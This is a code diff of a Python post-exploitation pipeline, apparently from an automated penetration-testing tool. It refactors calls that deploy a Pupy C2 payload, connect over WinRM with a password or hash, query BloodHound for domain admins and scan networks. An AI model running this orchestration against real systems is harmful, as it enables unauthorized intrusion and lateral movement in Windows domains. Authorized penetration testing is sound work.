@@ -1,4 +1,5 @@
 from __future__ import annotations
+import asyncio
 from typing import TYPE_CHECKING, Optional
 if TYPE_CHECKING:
     from ..runtime.session_manager import SandboxSession
@@ -58,7 +59,8 @@ class PostExploitPipeline:
             results["ladon"] = {"sandbox_result": sb_ladon.get("stdout", "")[:2000]}
         else:
             if use_skills:
-                ad_skill = self.skills.execute_skill(
+                ad_skill = await asyncio.to_thread(
+                    self.skills.execute_skill,
                     "performing-active-directory-penetration-test", [target_ip]
                 )
                 if ad_skill and "error" not in ad_skill:
@@ -68,11 +70,14 @@ class PostExploitPipeline:
                     }
                     results["skills_used"].append("performing-active-directory-penetration-test")
 
-            c2_result = self.pupy.deploy_payload(target_ip)
+            c2_result = await asyncio.to_thread(self.pupy.deploy_payload, target_ip)
             results["pupy"] = c2_result
 
             if username:
-                wr = self.winrm.connect(target_ip, username, password=password, hash=hash)
+                wr = await asyncio.to_thread(
+                    self.winrm.connect, target_ip, username,
+                    password=password, hash=hash,
+                )
                 results["winrm"] = wr
 
             if username:
@@ -80,11 +85,11 @@ class PostExploitPipeline:
                 results["netexec"] = ne
 
             if not use_skills or "bloodhound" not in results.get("bloodhound", {}):
-                bh = self.bloodhound.run_query("find_da")
+                bh = await asyncio.to_thread(self.bloodhound.run_query, "find_da")
                 results["bloodhound"] = bh
 
             if network:
-                ls = self.ladon.scan(network)
+                ls = await asyncio.to_thread(self.ladon.scan, network)
                 results["ladon"] = ls
 
         results["summary"] = {
